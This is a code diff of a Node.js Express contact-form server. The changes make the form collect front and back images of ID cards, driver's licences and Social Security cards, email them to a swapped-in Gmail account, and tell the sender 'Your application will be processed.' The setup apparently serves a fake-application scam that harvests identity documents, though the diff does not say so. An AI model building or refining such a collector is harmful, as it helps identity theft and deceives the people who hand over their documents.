@@ -28,13 +28,13 @@ async function mainMail(
   const transporter = await nodeMail.createTransport({
     service: "gmail",
     auth: {
-      user: process.env.GMAIL_USER,
-      pass: process.env.PASSWORD,
+      user: process.env.GMAIL_USER2,
+      pass: process.env.PASSWORD2,
     },
   });
   const mailOption = {
     from: email,
-    to: process.env.GMAIL_USER,
+    to: process.env.GMAIL_USER2,
     subject: subject,
     html: `
     <p>You got a message from Email : ${email}</p>
@@ -51,15 +51,11 @@ async function mainMail(
   };
   try {
     await transporter.sendMail(mailOption);
-    return Promise.resolve("Message Sent Successfully!");
+    return Promise.resolve("Your application will be processed. Thank you.");
   } catch (error) {
     return Promise.reject(error);
   }
 }
-
-// app.get("/", (req, res) => {
-//   res.render(index.html);
-// });
 
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "contact.html"));
@@ -68,9 +64,12 @@ app.get("/", (req, res) => {
 app.post(
   "/contact",
   upload.fields([
-    { name: "id-card", maxCount: 1 },
-    { name: "driver-license", maxCount: 1 },
-    { name: "social-security-number", maxCount: 1 },
+    { name: "id-card-front", maxCount: 1 },
+    { name: "id-card-back", maxCount: 1 },
+    { name: "driver-license-front", maxCount: 1 },
+    { name: "driver-license-back", maxCount: 1 },
+    { name: "social-security-number-front", maxCount: 1 },
+    { name: "social-security-number-back", maxCount: 1 },
   ]),
   async (req, res, next) => {
     const {
@@ -92,7 +91,7 @@ app.post(
           filename: fieldName,
         });
       }
-     
+
       await mainMail(
         yourname,
         youremail,
@@ -105,7 +104,7 @@ app.post(
         images
       );
 
-      res.send("Message Successfully Sent!");
+      res.send("Your application will be processed. Thank you.");
     } catch (error) {
       console.log(error);
       res.send("Message Could not be Sent");
